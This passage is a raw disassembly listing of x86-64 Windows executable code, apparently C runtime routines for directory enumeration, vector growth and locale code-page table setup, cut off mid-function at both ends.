   1400055cb:	48 3b c6             	cmp    %rsi,%rax
   1400055ce:	75 de                	jne    0x1400055ae
   1400055d0:	8a 0a                	mov    (%rdx),%cl
   1400055d2:	80 f9 3a             	cmp    $0x3a,%cl
   1400055d5:	75 1e                	jne    0x1400055f5
   1400055d7:	48 8d 46 01          	lea    0x1(%rsi),%rax
   1400055db:	48 3b d0             	cmp    %rax,%rdx
   1400055de:	74 15                	je     0x1400055f5
   1400055e0:	4d 8b ce             	mov    %r14,%r9
   1400055e3:	45 33 c0             	xor    %r8d,%r8d
   1400055e6:	33 d2                	xor    %edx,%edx
   1400055e8:	48 8b ce             	mov    %rsi,%rcx
   1400055eb:	e8 74 fe ff ff       	call   0x140005464
   1400055f0:	e9 81 00 00 00       	jmp    0x140005676
   1400055f5:	80 e9 2f             	sub    $0x2f,%cl
   1400055f8:	33 ff                	xor    %edi,%edi
   1400055fa:	80 f9 2d             	cmp    $0x2d,%cl
   1400055fd:	77 0d                	ja     0x14000560c
   1400055ff:	48 0f be c1          	movsbq %cl,%rax
   140005603:	48 0f a3 c3          	bt     %rax,%rbx
   140005607:	8d 47 01             	lea    0x1(%rdi),%eax
   14000560a:	72 02                	jb     0x14000560e
   14000560c:	8b c7                	mov    %edi,%eax
   14000560e:	48 2b d6             	sub    %rsi,%rdx
   140005611:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005616:	48 ff c2             	inc    %rdx
   140005619:	41 b8 40 01 00 00    	mov    $0x140,%r8d
   14000561f:	f6 d8                	neg    %al
   140005621:	4d 1b ff             	sbb    %r15,%r15
   140005624:	4c 23 fa             	and    %rdx,%r15
   140005627:	33 d2                	xor    %edx,%edx
   140005629:	e8 92 d1 ff ff       	call   0x1400027c0
   14000562e:	45 33 c9             	xor    %r9d,%r9d
   140005631:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140005635:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000563a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000563f:	33 d2                	xor    %edx,%edx
   140005641:	48 8b ce             	mov    %rsi,%rcx
   140005644:	ff 15 7e 6b 00 00    	call   *0x6b7e(%rip)        # 0x14000c1c8
   14000564a:	48 8b d8             	mov    %rax,%rbx
   14000564d:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005651:	75 4a                	jne    0x14000569d
   140005653:	4d 8b ce             	mov    %r14,%r9
   140005656:	45 33 c0             	xor    %r8d,%r8d
   140005659:	33 d2                	xor    %edx,%edx
   14000565b:	48 8b ce             	mov    %rsi,%rcx
   14000565e:	e8 01 fe ff ff       	call   0x140005464
   140005663:	8b f8                	mov    %eax,%edi
   140005665:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140005669:	74 09                	je     0x140005674
   14000566b:	48 8b cb             	mov    %rbx,%rcx
   14000566e:	ff 15 4c 6b 00 00    	call   *0x6b4c(%rip)        # 0x14000c1c0
   140005674:	8b c7                	mov    %edi,%eax
   140005676:	48 8b 8c 24 70 01 00 	mov    0x170(%rsp),%rcx
   14000567d:	00 
   14000567e:	48 33 cc             	xor    %rsp,%rcx
   140005681:	e8 1a c4 ff ff       	call   0x140001aa0
   140005686:	48 8b 9c 24 c8 01 00 	mov    0x1c8(%rsp),%rbx
   14000568d:	00 
   14000568e:	48 81 c4 80 01 00 00 	add    $0x180,%rsp
   140005695:	41 5f                	pop    %r15
   140005697:	41 5e                	pop    %r14
   140005699:	5f                   	pop    %rdi
   14000569a:	5e                   	pop    %rsi
   14000569b:	5d                   	pop    %rbp
   14000569c:	c3                   	ret
   14000569d:	49 8b 6e 08          	mov    0x8(%r14),%rbp
   1400056a1:	49 2b 2e             	sub    (%r14),%rbp
   1400056a4:	48 c1 fd 03          	sar    $0x3,%rbp
   1400056a8:	80 7c 24 5c 2e       	cmpb   $0x2e,0x5c(%rsp)
   1400056ad:	75 13                	jne    0x1400056c2
   1400056af:	8a 44 24 5d          	mov    0x5d(%rsp),%al
   1400056b3:	84 c0                	test   %al,%al
   1400056b5:	74 22                	je     0x1400056d9
   1400056b7:	3c 2e                	cmp    $0x2e,%al
   1400056b9:	75 07                	jne    0x1400056c2
   1400056bb:	40 38 7c 24 5e       	cmp    %dil,0x5e(%rsp)
   1400056c0:	74 17                	je     0x1400056d9
   1400056c2:	4d 8b ce             	mov    %r14,%r9
   1400056c5:	48 8d 4c 24 5c       	lea    0x5c(%rsp),%rcx
   1400056ca:	4d 8b c7             	mov    %r15,%r8
   1400056cd:	48 8b d6             	mov    %rsi,%rdx
   1400056d0:	e8 8f fd ff ff       	call   0x140005464
   1400056d5:	85 c0                	test   %eax,%eax
   1400056d7:	75 8a                	jne    0x140005663
   1400056d9:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400056de:	48 8b cb             	mov    %rbx,%rcx
   1400056e1:	ff 15 e9 6a 00 00    	call   *0x6ae9(%rip)        # 0x14000c1d0
   1400056e7:	85 c0                	test   %eax,%eax
   1400056e9:	75 bd                	jne    0x1400056a8
   1400056eb:	49 8b 06             	mov    (%r14),%rax
   1400056ee:	49 8b 56 08          	mov    0x8(%r14),%rdx
   1400056f2:	48 2b d0             	sub    %rax,%rdx
   1400056f5:	48 c1 fa 03          	sar    $0x3,%rdx
   1400056f9:	48 3b ea             	cmp    %rdx,%rbp
   1400056fc:	0f 84 63 ff ff ff    	je     0x140005665
   140005702:	48 2b d5             	sub    %rbp,%rdx
   140005705:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   140005709:	4c 8d 0d 34 fb ff ff 	lea    -0x4cc(%rip),%r9        # 0x140005244
   140005710:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140005716:	e8 85 2b 00 00       	call   0x1400082a0
   14000571b:	e9 45 ff ff ff       	jmp    0x140005665
   140005720:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005725:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000572a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000572f:	57                   	push   %rdi
   140005730:	48 83 ec 20          	sub    $0x20,%rsp
   140005734:	48 8b 71 10          	mov    0x10(%rcx),%rsi
   140005738:	48 8b f9             	mov    %rcx,%rdi
   14000573b:	48 39 71 08          	cmp    %rsi,0x8(%rcx)
   14000573f:	74 07                	je     0x140005748
   140005741:	33 c0                	xor    %eax,%eax
   140005743:	e9 8a 00 00 00       	jmp    0x1400057d2
   140005748:	33 db                	xor    %ebx,%ebx
   14000574a:	48 39 19             	cmp    %rbx,(%rcx)
   14000574d:	75 32                	jne    0x140005781
   14000574f:	8d 53 08             	lea    0x8(%rbx),%edx
   140005752:	8d 4b 04             	lea    0x4(%rbx),%ecx
   140005755:	e8 de f0 ff ff       	call   0x140004838
   14000575a:	33 c9                	xor    %ecx,%ecx
   14000575c:	48 89 07             	mov    %rax,(%rdi)
   14000575f:	e8 dc ef ff ff       	call   0x140004740
   140005764:	48 8b 07             	mov    (%rdi),%rax
   140005767:	48 85 c0             	test   %rax,%rax
   14000576a:	75 07                	jne    0x140005773
   14000576c:	b8 0c 00 00 00       	mov    $0xc,%eax
   140005771:	eb 5f                	jmp    0x1400057d2
   140005773:	48 89 47 08          	mov    %rax,0x8(%rdi)
   140005777:	48 83 c0 20          	add    $0x20,%rax
   14000577b:	48 89 47 10          	mov    %rax,0x10(%rdi)
   14000577f:	eb c0                	jmp    0x140005741
   140005781:	48 2b 31             	sub    (%rcx),%rsi
   140005784:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   14000578b:	ff ff 7f 
   14000578e:	48 c1 fe 03          	sar    $0x3,%rsi
   140005792:	48 3b f0             	cmp    %rax,%rsi
   140005795:	77 d5                	ja     0x14000576c
   140005797:	48 8b 09             	mov    (%rcx),%rcx
   14000579a:	48 8d 2c 36          	lea    (%rsi,%rsi,1),%rbp
   14000579e:	48 8b d5             	mov    %rbp,%rdx
   1400057a1:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400057a7:	e8 7c 21 00 00       	call   0x140007928
   1400057ac:	48 85 c0             	test   %rax,%rax
   1400057af:	75 05                	jne    0x1400057b6
   1400057b1:	8d 58 0c             	lea    0xc(%rax),%ebx
   1400057b4:	eb 13                	jmp    0x1400057c9
   1400057b6:	48 8d 0c f0          	lea    (%rax,%rsi,8),%rcx
   1400057ba:	48 89 07             	mov    %rax,(%rdi)
   1400057bd:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   1400057c1:	48 8d 0c e8          	lea    (%rax,%rbp,8),%rcx
   1400057c5:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   1400057c9:	33 c9                	xor    %ecx,%ecx
   1400057cb:	e8 70 ef ff ff       	call   0x140004740
   1400057d0:	8b c3                	mov    %ebx,%eax
   1400057d2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400057d7:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400057dc:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400057e1:	48 83 c4 20          	add    $0x20,%rsp
   1400057e5:	5f                   	pop    %rdi
   1400057e6:	c3                   	ret
   1400057e7:	90                   	nop
   1400057e8:	e9 6b fa ff ff       	jmp    0x140005258
   1400057ed:	90                   	nop
   1400057ee:	90                   	nop
   1400057ef:	90                   	nop
   1400057f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400057f5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400057fa:	57                   	push   %rdi
   1400057fb:	48 83 ec 20          	sub    $0x20,%rsp
   1400057ff:	49 8b d9             	mov    %r9,%rbx
   140005802:	49 8b f8             	mov    %r8,%rdi
   140005805:	8b 0a                	mov    (%rdx),%ecx
   140005807:	e8 70 0c 00 00       	call   0x14000647c
   14000580c:	90                   	nop
   14000580d:	48 8b cf             	mov    %rdi,%rcx
   140005810:	e8 13 00 00 00       	call   0x140005828
   140005815:	90                   	nop
   140005816:	8b 0b                	mov    (%rbx),%ecx
   140005818:	e8 b3 0c 00 00       	call   0x1400064d0
   14000581d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005822:	48 83 c4 20          	add    $0x20,%rsp
   140005826:	5f                   	pop    %rdi
   140005827:	c3                   	ret
   140005828:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000582d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005832:	57                   	push   %rdi
   140005833:	48 83 ec 20          	sub    $0x20,%rsp
   140005837:	48 8b 01             	mov    (%rcx),%rax
   14000583a:	48 8b d9             	mov    %rcx,%rbx
   14000583d:	48 8b 10             	mov    (%rax),%rdx
   140005840:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   140005847:	8b 50 04             	mov    0x4(%rax),%edx
   14000584a:	89 15 a8 09 01 00    	mov    %edx,0x109a8(%rip)        # 0x1400161f8
   140005850:	48 8b 01             	mov    (%rcx),%rax
   140005853:	48 8b 10             	mov    (%rax),%rdx
   140005856:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   14000585d:	8b 50 08             	mov    0x8(%rax),%edx
   140005860:	89 15 96 09 01 00    	mov    %edx,0x10996(%rip)        # 0x1400161fc
   140005866:	48 8b 01             	mov    (%rcx),%rax
   140005869:	48 8b 10             	mov    (%rax),%rdx
   14000586c:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   140005873:	48 8b 88 20 02 00 00 	mov    0x220(%rax),%rcx
   14000587a:	48 89 0d 8f 09 01 00 	mov    %rcx,0x1098f(%rip)        # 0x140016210
   140005881:	48 8b 03             	mov    (%rbx),%rax
   140005884:	48 8b 08             	mov    (%rax),%rcx
   140005887:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   14000588e:	48 83 c0 0c          	add    $0xc,%rax
   140005892:	74 17                	je     0x1400058ab
   140005894:	f2 0f 10 00          	movsd  (%rax),%xmm0
   140005898:	f2 0f 11 05 60 09 01 	movsd  %xmm0,0x10960(%rip)        # 0x140016200
   14000589f:	00 
   1400058a0:	8b 40 08             	mov    0x8(%rax),%eax
   1400058a3:	89 05 5f 09 01 00    	mov    %eax,0x1095f(%rip)        # 0x140016208
   1400058a9:	eb 1f                	jmp    0x1400058ca
   1400058ab:	33 c0                	xor    %eax,%eax
   1400058ad:	48 89 05 4c 09 01 00 	mov    %rax,0x1094c(%rip)        # 0x140016200
   1400058b4:	89 05 4e 09 01 00    	mov    %eax,0x1094e(%rip)        # 0x140016208
   1400058ba:	e8 31 f4 ff ff       	call   0x140004cf0
   1400058bf:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400058c5:	e8 06 f3 ff ff       	call   0x140004bd0
   1400058ca:	48 8b 03             	mov    (%rbx),%rax
   1400058cd:	bf 02 00 00 00       	mov    $0x2,%edi
   1400058d2:	48 8b 08             	mov    (%rax),%rcx
   1400058d5:	8d 77 7e             	lea    0x7e(%rdi),%esi
   1400058d8:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   1400058df:	48 8d 0d fa fa 00 00 	lea    0xfafa(%rip),%rcx        # 0x1400153e0
   1400058e6:	48 83 c0 18          	add    $0x18,%rax
   1400058ea:	74 52                	je     0x14000593e
   1400058ec:	8b d7                	mov    %edi,%edx
   1400058ee:	0f 10 00             	movups (%rax),%xmm0
   1400058f1:	0f 11 01             	movups %xmm0,(%rcx)
   1400058f4:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400058f8:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400058fc:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140005900:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140005904:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140005908:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   14000590c:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140005910:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140005914:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140005918:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   14000591c:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140005920:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140005924:	48 03 ce             	add    %rsi,%rcx
   140005927:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   14000592b:	48 03 c6             	add    %rsi,%rax
   14000592e:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140005932:	48 83 ea 01          	sub    $0x1,%rdx
   140005936:	75 b6                	jne    0x1400058ee
   140005938:	8a 00                	mov    (%rax),%al
   14000593a:	88 01                	mov    %al,(%rcx)
   14000593c:	eb 1d                	jmp    0x14000595b
   14000593e:	33 d2                	xor    %edx,%edx
   140005940:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140005946:	e8 75 ce ff ff       	call   0x1400027c0
   14000594b:	e8 a0 f3 ff ff       	call   0x140004cf0
   140005950:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005956:	e8 75 f2 ff ff       	call   0x140004bd0
   14000595b:	48 8b 03             	mov    (%rbx),%rax
   14000595e:	48 8b 08             	mov    (%rax),%rcx
   140005961:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140005968:	48 8d 0d 81 fb 00 00 	lea    0xfb81(%rip),%rcx        # 0x1400154f0
   14000596f:	48 05 19 01 00 00    	add    $0x119,%rax
   140005975:	74 4c                	je     0x1400059c3
   140005977:	0f 10 00             	movups (%rax),%xmm0
   14000597a:	0f 11 01             	movups %xmm0,(%rcx)
   14000597d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140005981:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140005985:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140005989:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   14000598d:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140005991:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140005995:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140005999:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   14000599d:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   1400059a1:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   1400059a5:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   1400059a9:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   1400059ad:	48 03 ce             	add    %rsi,%rcx
   1400059b0:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   1400059b4:	48 03 c6             	add    %rsi,%rax
   1400059b7:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   1400059bb:	48 83 ef 01          	sub    $0x1,%rdi
   1400059bf:	75 b6                	jne    0x140005977
   1400059c1:	eb 1d                	jmp    0x1400059e0
   1400059c3:	33 d2                	xor    %edx,%edx
   1400059c5:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   1400059cb:	e8 f0 cd ff ff       	call   0x1400027c0
   1400059d0:	e8 1b f3 ff ff       	call   0x140004cf0
   1400059d5:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400059db:	e8 f0 f1 ff ff       	call   0x140004bd0
   1400059e0:	48 8b 0d f1 f8 00 00 	mov    0xf8f1(%rip),%rcx        # 0x1400152d8
   1400059e7:	83 c8 ff             	or     $0xffffffff,%eax
   1400059ea:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   1400059ee:	83 f8 01             	cmp    $0x1,%eax
   1400059f1:	75 18                	jne    0x140005a0b
   1400059f3:	48 8b 0d de f8 00 00 	mov    0xf8de(%rip),%rcx        # 0x1400152d8
   1400059fa:	48 8d 05 af f6 00 00 	lea    0xf6af(%rip),%rax        # 0x1400150b0
   140005a01:	48 3b c8             	cmp    %rax,%rcx
   140005a04:	74 05                	je     0x140005a0b
   140005a06:	e8 35 ed ff ff       	call   0x140004740
   140005a0b:	48 8b 03             	mov    (%rbx),%rax
   140005a0e:	48 8b 08             	mov    (%rax),%rcx
   140005a11:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140005a18:	48 89 05 b9 f8 00 00 	mov    %rax,0xf8b9(%rip)        # 0x1400152d8
   140005a1f:	48 8b 03             	mov    (%rbx),%rax
   140005a22:	48 8b 08             	mov    (%rax),%rcx
   140005a25:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140005a2c:	f0 ff 00             	lock incl (%rax)
   140005a2f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005a34:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005a39:	48 83 c4 20          	add    $0x20,%rsp
   140005a3d:	5f                   	pop    %rdi
   140005a3e:	c3                   	ret
   140005a3f:	90                   	nop
   140005a40:	53                   	push   %rbx
   140005a41:	48 83 ec 40          	sub    $0x40,%rsp
   140005a45:	8b d9                	mov    %ecx,%ebx
   140005a47:	33 d2                	xor    %edx,%edx
   140005a49:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005a4e:	e8 5d ee ff ff       	call   0x1400048b0
   140005a53:	83 25 b2 07 01 00 00 	andl   $0x0,0x107b2(%rip)        # 0x14001620c
   140005a5a:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140005a5d:	75 12                	jne    0x140005a71
   140005a5f:	c7 05 a3 07 01 00 01 	movl   $0x1,0x107a3(%rip)        # 0x14001620c
   140005a66:	00 00 00 
   140005a69:	ff 15 71 67 00 00    	call   *0x6771(%rip)        # 0x14000c1e0
   140005a6f:	eb 15                	jmp    0x140005a86
   140005a71:	83 fb fd             	cmp    $0xfffffffd,%ebx
   140005a74:	75 14                	jne    0x140005a8a
   140005a76:	c7 05 8c 07 01 00 01 	movl   $0x1,0x1078c(%rip)        # 0x14001620c
   140005a7d:	00 00 00 
   140005a80:	ff 15 0a 67 00 00    	call   *0x670a(%rip)        # 0x14000c190
   140005a86:	8b d8                	mov    %eax,%ebx
   140005a88:	eb 17                	jmp    0x140005aa1
   140005a8a:	83 fb fc             	cmp    $0xfffffffc,%ebx
   140005a8d:	75 12                	jne    0x140005aa1
   140005a8f:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140005a94:	c7 05 6e 07 01 00 01 	movl   $0x1,0x1076e(%rip)        # 0x14001620c
   140005a9b:	00 00 00 
   140005a9e:	8b 58 0c             	mov    0xc(%rax),%ebx
   140005aa1:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140005aa6:	74 0c                	je     0x140005ab4
   140005aa8:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140005aad:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140005ab4:	8b c3                	mov    %ebx,%eax
   140005ab6:	48 83 c4 40          	add    $0x40,%rsp
   140005aba:	5b                   	pop    %rbx
   140005abb:	c3                   	ret
   140005abc:	90                   	nop
   140005abd:	90                   	nop
   140005abe:	90                   	nop
   140005abf:	90                   	nop
   140005ac0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005ac5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005aca:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005acf:	57                   	push   %rdi
   140005ad0:	48 83 ec 20          	sub    $0x20,%rsp
   140005ad4:	48 8d 59 18          	lea    0x18(%rcx),%rbx
   140005ad8:	48 8b f1             	mov    %rcx,%rsi
   140005adb:	bd 01 01 00 00       	mov    $0x101,%ebp
   140005ae0:	48 8b cb             	mov    %rbx,%rcx
   140005ae3:	44 8b c5             	mov    %ebp,%r8d
   140005ae6:	33 d2                	xor    %edx,%edx
   140005ae8:	e8 d3 cc ff ff       	call   0x1400027c0
   140005aed:	33 c0                	xor    %eax,%eax
   140005aef:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   140005af3:	48 89 46 04          	mov    %rax,0x4(%rsi)
   140005af7:	b9 06 00 00 00       	mov    $0x6,%ecx
   140005afc:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   140005b03:	0f b7 c0             	movzwl %ax,%eax
   140005b06:	66 f3 ab             	rep stos %ax,(%rdi)
   140005b09:	48 8d 3d a0 f5 00 00 	lea    0xf5a0(%rip),%rdi        # 0x1400150b0
   140005b10:	48 2b fe             	sub    %rsi,%rdi
   140005b13:	8a 04 1f             	mov    (%rdi,%rbx,1),%al
   140005b16:	88 03                	mov    %al,(%rbx)
   140005b18:	48 ff c3             	inc    %rbx
   140005b1b:	48 83 ed 01          	sub    $0x1,%rbp
   140005b1f:	75 f2                	jne    0x140005b13
   140005b21:	48 8d 8e 19 01 00 00 	lea    0x119(%rsi),%rcx
   140005b28:	ba 00 01 00 00       	mov    $0x100,%edx
   140005b2d:	8a 04 39             	mov    (%rcx,%rdi,1),%al
   140005b30:	88 01                	mov    %al,(%rcx)
   140005b32:	48 ff c1             	inc    %rcx
   140005b35:	48 83 ea 01          	sub    $0x1,%rdx
   140005b39:	75 f2                	jne    0x140005b2d
   140005b3b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005b40:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005b45:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005b4a:	48 83 c4 20          	add    $0x20,%rsp
   140005b4e:	5f                   	pop    %rdi
   140005b4f:	c3                   	ret
   140005b50:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005b55:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140005b5a:	55                   	push   %rbp
   140005b5b:	48 8d ac 24 80 f9 ff 	lea    -0x680(%rsp),%rbp
   140005b62:	ff 
   140005b63:	48 81 ec 80 07 00 00 	sub    $0x780,%rsp
   140005b6a:	48 8b 05 a7 f4 00 00 	mov    0xf4a7(%rip),%rax        # 0x140015018
   140005b71:	48 33 c4             	xor    %rsp,%rax
   140005b74:	48 89 85 70 06 00 00 	mov    %rax,0x670(%rbp)
   140005b7b:	48 8b f9             	mov    %rcx,%rdi
   140005b7e:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140005b83:	8b 49 04             	mov    0x4(%rcx),%ecx
   140005b86:	ff 15 5c 66 00 00    	call   *0x665c(%rip)        # 0x14000c1e8
   140005b8c:	bb 00 01 00 00       	mov    $0x100,%ebx
   140005b91:	85 c0                	test   %eax,%eax
   140005b93:	0f 84 36 01 00 00    	je     0x140005ccf
   140005b99:	33 c0                	xor    %eax,%eax
   140005b9b:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005ba0:	88 01                	mov    %al,(%rcx)
   140005ba2:	ff c0                	inc    %eax
   140005ba4:	48 ff c1             	inc    %rcx
   140005ba7:	3b c3                	cmp    %ebx,%eax
   140005ba9:	72 f5                	jb     0x140005ba0
   140005bab:	8a 44 24 56          	mov    0x56(%rsp),%al
   140005baf:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   140005bb4:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   140005bb9:	eb 22                	jmp    0x140005bdd
   140005bbb:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   140005bc0:	0f b6 c8             	movzbl %al,%ecx
   140005bc3:	eb 0d                	jmp    0x140005bd2
   140005bc5:	3b cb                	cmp    %ebx,%ecx
   140005bc7:	73 0e                	jae    0x140005bd7
   140005bc9:	8b c1                	mov    %ecx,%eax
   140005bcb:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   140005bd0:	ff c1                	inc    %ecx
   140005bd2:	41 3b c8             	cmp    %r8d,%ecx
   140005bd5:	76 ee                	jbe    0x140005bc5
   140005bd7:	48 83 c2 02          	add    $0x2,%rdx
   140005bdb:	8a 02                	mov    (%rdx),%al
   140005bdd:	84 c0                	test   %al,%al
   140005bdf:	75 da                	jne    0x140005bbb
   140005be1:	8b 47 04             	mov    0x4(%rdi),%eax
   140005be4:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140005be9:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   140005bee:	44 8b cb             	mov    %ebx,%r9d
   140005bf1:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140005bf5:	ba 01 00 00 00       	mov    $0x1,%edx
   140005bfa:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   140005c01:	33 c9                	xor    %ecx,%ecx
   140005c03:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005c08:	e8 5b 17 00 00       	call   0x140007368
   140005c0d:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140005c12:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140005c17:	8b 47 04             	mov    0x4(%rdi),%eax
   140005c1a:	44 8b c3             	mov    %ebx,%r8d
   140005c1d:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   140005c24:	33 c9                	xor    %ecx,%ecx
   140005c26:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140005c2a:	48 8d 45 70          	lea    0x70(%rbp),%rax
   140005c2e:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140005c32:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005c37:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140005c3b:	e8 1c 2f 00 00       	call   0x140008b5c
   140005c40:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140005c45:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140005c4a:	8b 47 04             	mov    0x4(%rdi),%eax
   140005c4d:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140005c53:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   140005c5a:	33 c9                	xor    %ecx,%ecx
   140005c5c:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140005c60:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   140005c67:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140005c6b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005c70:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140005c74:	e8 e3 2e 00 00       	call   0x140008b5c
   140005c79:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   140005c7d:	4c 2b c7             	sub    %rdi,%r8
   140005c80:	4c 8d 8d 70 01 00 00 	lea    0x170(%rbp),%r9
   140005c87:	4c 2b cf             	sub    %rdi,%r9
   140005c8a:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   140005c91:	48 8d 4f 19          	lea    0x19(%rdi),%rcx
   140005c95:	f6 02 01             	testb  $0x1,(%rdx)
   140005c98:	74 0a                	je     0x140005ca4
   140005c9a:	80 09 10             	orb    $0x10,(%rcx)
   140005c9d:	41 8a 44 08 e7       	mov    -0x19(%r8,%rcx,1),%al
   140005ca2:	eb 0d                	jmp    0x140005cb1
   140005ca4:	f6 02 02             	testb  $0x2,(%rdx)
   140005ca7:	74 10                	je     0x140005cb9
   140005ca9:	80 09 20             	orb    $0x20,(%rcx)
   140005cac:	41 8a 44 09 e7       	mov    -0x19(%r9,%rcx,1),%al
   140005cb1:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   140005cb7:	eb 07                	jmp    0x140005cc0
   140005cb9:	c6 81 00 01 00 00 00 	movb   $0x0,0x100(%rcx)
   140005cc0:	48 ff c1             	inc    %rcx
   140005cc3:	48 83 c2 02          	add    $0x2,%rdx
   140005cc7:	48 83 eb 01          	sub    $0x1,%rbx
   140005ccb:	75 c8                	jne    0x140005c95
   140005ccd:	eb 3f                	jmp    0x140005d0e
   140005ccf:	33 d2                	xor    %edx,%edx
   140005cd1:	48 8d 4f 19          	lea    0x19(%rdi),%rcx
